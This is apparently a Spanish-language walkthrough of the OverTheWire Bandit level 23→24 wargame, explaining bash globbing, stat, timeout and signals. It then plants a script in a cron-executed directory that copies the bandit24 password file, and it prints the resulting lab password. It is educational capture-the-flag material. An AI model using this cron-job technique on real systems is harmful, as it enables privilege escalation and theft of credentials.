<!-- Autor: Daniel Benjamin Perez Morales -->
<!-- GitHub: https://github.com/DanielPerezMoralesDev13 -->
<!-- Correo electrónico: danielperezdev@proton.me  -->

# ***Bandido Nivel 23 → Nivel 24***

- *Meta de nivel*

- *Un programa se está ejecutando automáticamente a intervalos regulares desde cron, el programador de trabajos basado en tiempo. Busca en /etc/cron.d/ la configuración y mira qué comando se está ejecutando.*

- *NOTA: Este nivel requiere que crees tu primer shell-script. Este es un gran paso y deberías estar orgulloso de ti mismo cuando superes este nivel.*

- *NOTA 2: Ten en cuenta que tu shell-script se elimina una vez ejecutado, así que puede que quieras guardar una copia por ahí...*
- *Comandos que puedes necesitar para resolver este nivel*

- *chmod, cron, crontab, crontab(5) (usa «man 5 crontab» para acceder a esto)*

## **Explicación detallada del uso de `*` y `.*` en Bash**

## **1. Concepto de comodines (`*` y `.*`):**

- *En Bash, los comodines son caracteres especiales que permiten realizar búsquedas de patrones en nombres de archivos o directorios.*

### **Comodín `*`:**

- **Significado:** *Representa cualquier cantidad de caracteres (incluido ninguno).*
- **Uso:** *Coincide con todos los archivos o directorios que no comienzan con un punto (`.`), es decir, archivos "visibles".*
- **Ejemplo:**

  ```bash
  for i in *; do echo $i; done
  ```

  **Salida:**

  ```bash
  client.c
  lib.lua
  main.py
  script.sh
  server.php
  ```

  **Explicación:** *Se listan todos los archivos visibles en el directorio actual.*

---

### **Comodín `.*`:**

- **Significado:** *Coincide con cualquier archivo o directorio cuyo nombre comienza con un punto (`.`).*
- **Uso:** *Se usa para listar archivos "ocultos" o de configuración.*
- **Ejemplo:**

  ```bash
  for i in .*; do echo $i; done
  ```

  **Salida:**

  ```bash
  .
  ..
  ```

  **Explicación:**
  - *`.` representa el directorio actual.*
  - *`..` representa el directorio padre.*

> [!WARNING]
> **⚠️ Nota:** *Si hay más archivos ocultos en el directorio, también se listarán.*

---

## **2. Prueba de concepto con el script:**

```bash
#!/usr/bin/env bash

for i in * .*; do echo "Content $i"; done
```

### **Desglose del comportamiento del script:**

- **Comando:** **`for i in * .*;`**
  - *El bucle recorre todos los archivos visibles (`*`) y ocultos (`.*`).*
- **Comando dentro del bucle:** *`echo "Content $i"`*
  - *Imprime el nombre de cada archivo o directorio encontrado.*

---

### **Salida del script:**

```bash
./script.sh
Content client.c
Content lib.lua
Content main.py
Content script.sh
Content server.php
Content .
Content ..
```

- **Archivos visibles:** *`client.c`, `lib.lua`, `main.py`, `script.sh`, `server.php`.*
- **Archivos ocultos:** *`.` y `..` (directorio actual y su directorio padre).*

---

## **Conclusión:**

- **`*`:** *Coincide con todos los archivos visibles en un directorio.*
- **`.*`:** *Coincide con todos los archivos ocultos, incluyendo `.` y `..`.*
- **Uso seguro:** *Es importante tener cuidado con `.*` para evitar operaciones no deseadas en directorios especiales como `.` y `..`.*

## **Explicación del comando `stat` y su uso:**

- *El comando `stat` se utiliza en sistemas Linux para obtener información detallada sobre un archivo o directorio, incluyendo permisos, propietario, tamaño, fechas de acceso/modificación y atributos del sistema de archivos.*

---

### **Salida del comando `stat main.py`:**

```bash
➜  d4nitrix13 tmp.nVyQqzviER stat main.py
  Fichero: main.py
  Tamaño: 0             Bloques: 0          Bloque E/S: 4096   fichero regular vacío
Device: 8,5     Inode: 2228295     Links: 1
Acceso: (0664/-rw-rw-r--)  Uid: ( 1000/d4nitrix13)   Gid: ( 1000/d4nitrix13)
Acceso: 2024-11-28 15:38:46.622492684 -0600
Modificación: 2024-11-28 15:38:46.622492684 -0600
Cambio: 2024-11-28 15:38:46.622492684 -0600
Creación: 2024-11-28 15:38:46.622492684 -0600
```

### **Desglose de la salida:**

- **Fichero:** *Nombre del archivo (`main.py`).*
- **Tamaño:** *El archivo tiene un tamaño de 0 bytes (archivo vacío).*
- **Bloques:** *El archivo no ocupa bloques de disco.*
- **Bloque E/S:** *Tamaño del bloque de E/S en el sistema (4096 bytes).*
- **Device:** *Número de dispositivo (`8,5`).*
- **Inode:** *Número de inodo (`2228295`), identificador único del archivo en el sistema de archivos.*
- **Links:** *Número de enlaces duros al archivo (1).*
- **Acceso:** *Permisos del archivo (`0664` en octal y `-rw-rw-r--` en formato simbólico).*
- **Uid / Gid:** *El archivo pertenece al usuario `d4nitrix13` (UID 1000) y al grupo `d4nitrix13` (GID 1000).*
- **Acceso / Modificación / Cambio / Creación:** *Fechas y horas de acceso, modificación, cambio de metadatos y creación del archivo.*

---

### **Uso de `--format` con `stat`:**

```bash
➜  d4nitrix13 tmp.nVyQqzviER stat --format "%U" main.py
d4nitrix13
```

- **Comando:** `stat --format "%U" main.py`
- **Explicación:**
  - *`--format "%U"` indica que solo se desea mostrar el **nombre del propietario** del archivo (`d4nitrix13`).*
  - **`%U`:** *Especifica el nombre del usuario propietario del archivo.*

---

### **Otros formatos útiles con `stat --format`:**

- **`%s`:** *Tamaño del archivo en bytes.*
- **`%F`:** *Tipo de archivo (por ejemplo, "regular file").*
- **`%A`:** *Permisos del archivo en formato simbólico.*
- **`%Y`:** *Fecha de última modificación en segundos desde el epoch.*

#### **Ejemplo:**

```bash
stat --format="Tamaño: %s bytes, Propietario: %U, Última modificación: %Y" main.py
```

```bash
➜  d4nitrix13 tmp.nVyQqzviER stat --format="Tamaño: %s bytes, Propietario: %U, Última modificación: %Y" main.py
Tamaño: 0 bytes, Propietario: d4nitrix13, Última modificación: 1732829926
```

*El comando `stat` es útil para obtener detalles técnicos sobre archivos, especialmente cuando se necesita información precisa sobre permisos, propietarios o marcas de tiempo. La opción `--format` permite personalizar la salida según las necesidades del usuario.*

- *El formato **`%Y`** en `stat` es correcto, pero **devuelve la marca de tiempo en formato Unix Epoch**, es decir, el número de segundos transcurridos desde el 1 de enero de 1970.*

---

### **Ejemplo y explicación:**

```bash
➜  d4nitrix13 tmp.nVyQqzviER stat --format="Tamaño: %s bytes, Propietario: %U, Última modificación: %Y" main.py
Tamaño: 0 bytes, Propietario: d4nitrix13, Última modificación: 1732829926
```

- **`%s`:** *Muestra el tamaño del archivo en bytes.*
- **`%U`:** *Muestra el nombre del propietario del archivo.*
- **`%Y`:** *Muestra la fecha de **última modificación** en formato Unix Epoch (1732829926 en tu ejemplo).*

---

### **Conversión de Epoch a formato legible:**

- *Si deseas convertir esta marca de tiempo a una fecha legible, puedes usar el comando **`date`**:*

```bash
➜ date -d @1732829926
Thu Nov 28 15:38:46 2024
```

---

### **Formato legible directamente con `stat`:**

- *Para mostrar la fecha en un formato legible sin necesidad de convertir, puedes usar **`%y`** en lugar de **`%Y`**:*

```bash
stat --format="Tamaño: %s bytes, Propietario: %U, Última modificación: %y" main.py
```

- **Esto devolverá una salida similar a:**

```bash
Tamaño: 0 bytes, Propietario: d4nitrix13, Última modificación: 2024-11-28 15:38:46.622492684 -0600
```

---

### **Resumen:**

- **`%Y`:** *Devuelve la fecha en formato Unix Epoch.*
- **`%y`:** *Devuelve la fecha en un formato legible como `YYYY-MM-DD HH:MM:SS`.*
- *Puedes usar el comando `date` para convertir Epoch a formato legible si es necesario.*

---

### **Desglose del comando:**

- *El comando **`timeout -s 9 60`** tiene el propósito de ejecutar otro comando durante un tiempo limitado, después del cual se envía una señal específica para detener el proceso si sigue ejecutándose.*

- **`timeout`:** *Utilidad que ejecuta un comando y lo detiene después de un tiempo especificado.*
  
- **`-s 9`:** *Indica la señal que se enviará al comando cuando expire el tiempo.*
  - **`9`** *corresponde a la señal **`SIGKILL`**, que **termina inmediatamente** el proceso de manera forzada.*
  - *Otras señales comunes incluyen:*
    - **`-s 15`** *(SIGTERM): Solicita al proceso que termine de manera limpia.*
    - **`-s 2`** *(SIGINT): Emula un Ctrl+C.*
  
- **`60`:** *Tiempo en **segundos** que `timeout` esperará antes de enviar la señal al proceso.*

---

### **Ejemplo de uso:**

```bash
timeout -s 9 60 sleep 100
```

- *Ejecuta el comando `sleep 100`, pero lo detendrá después de **60 segundos** enviando la señal `SIGKILL` (forzada).*
- *Si el comando **termina antes de los 60 segundos**, la señal no se enviará.*

---

### **Utilidad:**

- **Control de procesos largos:** *Si un proceso se cuelga o no responde, este comando asegura su finalización.*
- **Scripts automatizados:** *Garantiza que comandos no consuman más tiempo del permitido.*

---

### **¿Por qué usar SIGKILL (`-s 9`)?**

- *`SIGKILL` fuerza la terminación sin darle al proceso la oportunidad de limpiar recursos. Se usa en situaciones donde el proceso no responde a señales más suaves como `SIGTERM`.*

### **Tabla de Señales en Linux**

| **Número** | **Nombre**   | **Descripción**                                                                               | **Uso principal**                                                |
| ---------- | ------------ | --------------------------------------------------------------------------------------------- | ---------------------------------------------------------------- |
| *1*        | *SIGHUP*     | *Hangup. Se envía cuando una terminal cierra sesión.*                                         | *Recargar configuración de procesos (como `nginx`, `apache`).*   |
| *2*        | *SIGINT*     | *Interrupt. Se envía al presionar `Ctrl+C`.*                                                  | *Interrumpir procesos manualmente.*                              |
| *3*        | *SIGQUIT*    | *Quit. Se envía con `Ctrl+\`.*                                                                | *Interrumpir y generar un volcado de memoria (core dump).*       |
| *6*        | *SIGABRT*    | *Abort. Señal de aborto enviada por el propio proceso.*                                       | *Finalizar procesos que detectan errores internos.*              |
| *9*        | *SIGKILL*    | *Kill. Termina el proceso **inmediatamente** (no se puede ignorar).*                          | *Finalización forzada de procesos.*                              |
| *11*       | *SIGSEGV*    | *Segmentation fault. Error de acceso a memoria inválido.*                                     | *Diagnosticar errores de segmentación en programas.*             |
| *13*       | *SIGPIPE*    | *Broken pipe. Se envía cuando un proceso intenta escribir en una tubería cerrada.*            | *Gestionar errores de comunicación entre procesos.*              |
| *14*       | *SIGALRM*    | *Alarm clock. Se envía tras el tiempo definido por `alarm()`.*                                | *Programar tareas basadas en tiempo.*                            |
| *15*       | *SIGTERM*    | *Terminate. Solicita la terminación **limpia** de un proceso.*                                | *Finalizar procesos de forma controlada.*                        |
| *17*       | *SIGCHLD*    | *Child status change. Se envía a un padre cuando un proceso hijo termina o cambia de estado.* | *Gestionar procesos hijos en scripts o aplicaciones.*            |
| *18*       | *SIGCONT*    | *Continue. Reanuda un proceso detenido.*                                                      | *Reanudar procesos pausados con `SIGSTOP`.*                      |
| *19*       | *SIGSTOP*    | *Stop. Pausa un proceso (no se puede ignorar).*                                               | *Pausar procesos temporalmente para inspección o depuración.*    |
| *20*       | *SIGTSTP*    | *Terminal stop. Se envía al presionar `Ctrl+Z`.*                                              | *Pausar procesos desde la terminal.*                             |
| *23*       | *SIGURG*     | *Urgent data. Indica datos urgentes en una conexión de socket.*                               | *Gestionar conexiones de red.*                                   |
| *24*       | *SIGXCPU*    | *CPU time limit exceeded.*                                                                    | *Finalizar procesos que exceden límites de uso de CPU.*          |
| *25*       | *SIGXFSZ*    | *File size limit exceeded.*                                                                   | *Gestionar procesos que superan el tamaño de archivo permitido.* |
| *30*       | *SIGUSR1*    | *User-defined signal 1.*                                                                      | *Señal definida por el usuario para propósitos específicos.*     |
| *31*       | *SIGUSR2*    | *User-defined signal 2.*                                                                      | *Otra señal definida por el usuario.*                            |
| *34+*      | *SIGRTMIN+X* | *Señales en tiempo real (Real-time signals).*                                                 | *Personalización avanzada en aplicaciones concurrentes.*         |

---

### **Notas importantes:**

- **SIGKILL (9)** y **SIGSTOP (19)** **no pueden ser ignoradas** por los procesos.
- **SIGTERM (15)** *es la señal estándar para terminar procesos de manera controlada.*
- **Señales personalizadas:** *`SIGUSR1` y `SIGUSR2` permiten que los usuarios definan acciones específicas en sus programas.*

### **Comando útil:**

- *Para listar todas las señales disponibles en tu sistema:*

```bash
kill -l
```

```bash
kill -l
1) SIGHUP       2) SIGINT       3) SIGQUIT      4) SIGILL       5) SIGTRAP
6) SIGABRT      7) SIGBUS       8) SIGFPE       9) SIGKILL     10) SIGUSR1
11) SIGSEGV     12) SIGUSR2     13) SIGPIPE     14) SIGALRM     15) SIGTERM
16) SIGSTKFLT   17) SIGCHLD     18) SIGCONT     19) SIGSTOP     20) SIGTSTP
21) SIGTTIN     22) SIGTTOU     23) SIGURG      24) SIGXCPU     25) SIGXFSZ
26) SIGVTALRM   27) SIGPROF     28) SIGWINCH    29) SIGIO       30) SIGPWR
31) SIGSYS      34) SIGRTMIN    35) SIGRTMIN+1  36) SIGRTMIN+2  37) SIGRTMIN+3
38) SIGRTMIN+4  39) SIGRTMIN+5  40) SIGRTMIN+6  41) SIGRTMIN+7  42) SIGRTMIN+8
43) SIGRTMIN+9  44) SIGRTMIN+10 45) SIGRTMIN+11 46) SIGRTMIN+12 47) SIGRTMIN+13
48) SIGRTMIN+14 49) SIGRTMIN+15 50) SIGRTMAX-14 51) SIGRTMAX-13 52) SIGRTMAX-12
53) SIGRTMAX-11 54) SIGRTMAX-10 55) SIGRTMAX-9  56) SIGRTMAX-8  57) SIGRTMAX-7
58) SIGRTMAX-6  59) SIGRTMAX-5  60) SIGRTMAX-4  61) SIGRTMAX-3  62) SIGRTMAX-2
63) SIGRTMAX-1  64) SIGRTMAX
```

### **Explicación detallada del proceso y comandos utilizados para pasar del nivel 23 al nivel 24 en Bandit**

---

### **Objetivo:**

- *El nivel 23 requiere explotar un script que se ejecuta automáticamente por un **cron job** para obtener la contraseña del siguiente nivel.*

---

## **Pasos detallados:**

### **1. Exploración del cron job:**

```bash
cd /etc/cron.d
ll
```

- **Accedemos al directorio** `/etc/cron.d` que contiene archivos de configuración para tareas automáticas de cron.
  
- **Salida relevante:**
  
  ```bash
  -rw-r--r--   1 root root   122 Sep 19 07:08 cronjob_bandit24
  ```

  - *El archivo `cronjob_bandit24` es el que controla el script relacionado con el usuario bandit24.*

---

### **2. Lectura del archivo cron:**

```bash
cat cronjob_bandit24
```

- **Salida:**

  ```bash
  @reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
  * * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
  ```

  - *El script `/usr/bin/cronjob_bandit24.sh` se ejecuta cada minuto y en cada reinicio.*
  
---

### **3. Análisis del script cronjob:**

```bash
cat /usr/bin/cronjob_bandit24.sh
```

- **Contenido del script:**

  ```bash
  #!/bin/bash
  myname=$(whoami)
  cd /var/spool/$myname/foo
  echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
  for i in * .*;
  do
      if [ "$i" != "." -a "$i" != ".." ];
      then
          echo "Handling $i"
          owner="$(stat --format "%U" ./$i)"
          if [ "${owner}" = "bandit23" ]; then
              timeout -s 9 60 ./$i
          fi
          rm -f ./$i
      fi
  done
  ```

#### **Explicación del script:**

- **myname=$(whoami):** *Obtiene el nombre del usuario que ejecuta el script (`bandit24`).*
- **cd /var/spool/$myname/foo:** *Cambia al directorio `/var/spool/bandit24/foo`.*
- **for i in * .*::** *Itera sobre todos los archivos en el directorio.*
- **timeout -s 9 60 ./$i:** *Ejecuta cada script con un límite de 60 segundos.*
- **rm -f ./$i:** *Borra el script después de ejecutarlo.*

#### **Clave:** El script solo ejecuta archivos propiedad de `bandit23`, por lo que debes crear uno propio y copiarlo al directorio correcto

---

### **4. Creación del script de explotación:**

#### **Preparar entorno temporal:**

```bash
cd $(mktemp -d)
touch script.sh
chmod o+x script.sh
chmod o+wx ./
```

- **mktemp -d:** *Crea un directorio temporal.*
- **touch script.sh:** *Crea el archivo del script.*
- **chmod o+x script.sh:** *Da permisos de ejecución al script.*
- **chmod o+wx ./:** *Permite escritura y ejecución en el directorio.*

---

### **5. Creación del script:**

```bash
nano script.sh
```

**Contenido del script:**

```bash
#!/usr/bin/env bash
cat /etc/bandit_pass/bandit24 > /tmp/tmp.2KwDUD75Qy/d4nipwned.txt
exit 0
```

- **cat /etc/bandit_pass/bandit24 > /tmp/tmp.2KwDUD75Qy/d4nipwned.txt:** *Copia la contraseña del archivo protegido a un archivo en el directorio temporal.*
  
---

### **6. Copiar el script al directorio monitoreado:**

```bash
cp ./script.sh /var/spool/bandit24/foo/script.sh -v
```

- *Copia el script al directorio `/var/spool/bandit24/foo/` para que el cron job lo ejecute.*

---

### **7. Monitorear la ejecución del script:**

```bash
watch -n 1 ls -l
```

- **watch -n 1 ls -l:** *Revisa cada segundo el contenido del directorio para detectar cambios.*

#### **Salida:**

```bash
total 8
-rw-rw-r-- 1 bandit24 bandit24 33 Nov 28 22:38 d4nipwned.txt
-rw-rw-r-x 1 bandit23 bandit23 94 Nov 28 22:35 script.sh
```

---

### **8. Verificar la contraseña:**

```bash
cat d4nipwned.txt
```

```bash
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
```

**¡Contraseña obtenida!**

- *Este nivel requiere crear un script que el cron job ejecute automáticamente, aprovechando los permisos del usuario `bandit24`. Copiar el script al directorio monitoreado permite acceder a la contraseña protegida y avanzar al siguiente nivel.*
